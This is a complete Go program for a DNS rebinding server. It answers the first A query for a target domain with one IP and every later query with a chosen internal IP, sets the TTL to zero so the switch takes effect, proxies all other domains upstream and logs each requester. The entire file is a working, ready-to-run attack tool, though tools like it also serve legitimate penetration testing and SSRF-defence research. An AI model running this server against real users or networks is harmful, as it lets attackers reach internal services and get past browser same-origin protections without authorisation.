package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strings"
	"sync"

	"github.com/miekg/dns"
)

// RecordState tracks the state of a domain
type RecordState struct {
	mu           sync.Mutex
	seenDomains  map[string]bool
	validIP      net.IP
	internalIP   net.IP
	logger       *log.Logger
	targetDomain string
	upstream     string
}

func NewRecordState(validIP, internalIP net.IP, targetDomain string, upstream string, logger *log.Logger) *RecordState {
	return &RecordState{
		seenDomains:  make(map[string]bool),
		validIP:      validIP,
		internalIP:   internalIP,
		targetDomain: targetDomain,
		upstream:     upstream,
		logger:       logger,
	}
}

func (rs *RecordState) handleDNSRequest(w dns.ResponseWriter, r *dns.Msg) {
	msg := new(dns.Msg)
	msg.SetReply(r)
	msg.Authoritative = true

	for _, question := range r.Question {
		// Only handle A records
		if question.Qtype == dns.TypeA {
			domain := question.Name
			cleanDomain := strings.TrimSuffix(domain, ".")

			// Check if it matches our target domain (or subdomain)
			isMatch := strings.HasSuffix(cleanDomain, rs.targetDomain)
			if !isMatch {
				// Proxy to upstream
				c := new(dns.Client)
				in, _, err := c.Exchange(r, rs.upstream)
				if err != nil {
					rs.logger.Printf("Proxy Error: %v", err)
					return
				}
				w.WriteMsg(in)
				rs.logger.Printf("Src: %s, Domain: %s, Action: PROXY", w.RemoteAddr(), domain)
				return
			}

			rs.mu.Lock()
			seen := rs.seenDomains[domain]
			if !seen {
				rs.seenDomains[domain] = true
			}
			rs.mu.Unlock()

			var ipToReturn net.IP
			var stateStr string

			if seen {
				ipToReturn = rs.internalIP
				stateStr = "RETURNING"
			} else {
				ipToReturn = rs.validIP
				stateStr = "NEW"
			}

			rr := &dns.A{
				Hdr: dns.RR_Header{
					Name:   question.Name,
					Rrtype: dns.TypeA,
					Class:  dns.ClassINET,
					Ttl:    0, // No caching to ensure rebind works
				},
				A: ipToReturn,
			}
			msg.Answer = append(msg.Answer, rr)

			// Log the request
			// Format: Timestamp, Source IP, Domain, Response IP, State
			remoteAddr, _, _ := net.SplitHostPort(w.RemoteAddr().String())
			rs.logger.Printf("Src: %s, Domain: %s, Resp: %s, State: %s",
				remoteAddr, domain, ipToReturn.String(), stateStr)
		}
	}

	w.WriteMsg(msg)
}

func main() {
	validIPStr := flag.String("valid", "", "Valid IP address to return on first request")
	internalIPStr := flag.String("internal", "", "Internal IP address to return on subsequent requests")
	logFileStr := flag.String("log", "", "Path to log file (default: stdout)")
	portStr := flag.String("port", "53", "UDP port to listen on")
	targetDomain := flag.String("domain", "", "Target domain (mandatory) - queries for this domain (and subdomains) will be rebinded, others proxied")
	upstreamDNS := flag.String("upstream", "8.8.8.8:53", "Upstream DNS server for non-matching domains")
	flag.Parse()

	if *validIPStr == "" || *internalIPStr == "" || *targetDomain == "" {
		fmt.Println("Error: -valid, -internal and -domain flags are required")
		flag.Usage()
		os.Exit(1)
	}

	validIP := net.ParseIP(*validIPStr)
	if validIP == nil {
		fmt.Printf("Error: Invalid valid IP: %s\n", *validIPStr)
		os.Exit(1)
	}

	internalIP := net.ParseIP(*internalIPStr)
	if internalIP == nil {
		fmt.Printf("Error: Invalid internal IP: %s\n", *internalIPStr)
		os.Exit(1)
	}

	// Setup logging
	var logOutput io.Writer = os.Stdout
	if *logFileStr != "" {
		f, err := os.OpenFile(*logFileStr, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			fmt.Printf("Error opening log file: %v\n", err)
			os.Exit(1)
		}
		defer f.Close()
		logOutput = f
	}

	logger := log.New(logOutput, "", log.LstdFlags)

	recordState := NewRecordState(validIP, internalIP, *targetDomain, *upstreamDNS, logger)

	// DNS server handler
	dns.HandleFunc(".", recordState.handleDNSRequest)

	server := &dns.Server{Addr: ":" + *portStr, Net: "udp"}

	fmt.Printf("Starting Rebind DNS Server on port %s\n", *portStr)
	fmt.Printf("Target Domain: %s (and subdomains)\n", *targetDomain)
	fmt.Printf("First query: %s\n", validIP.String())
	fmt.Printf("Subsequent queries: %s\n", internalIP.String())

	if err := server.ListenAndServe(); err != nil {
		fmt.Printf("Failed to start server: %s\n", err.Error())
		os.Exit(1)
	}
}
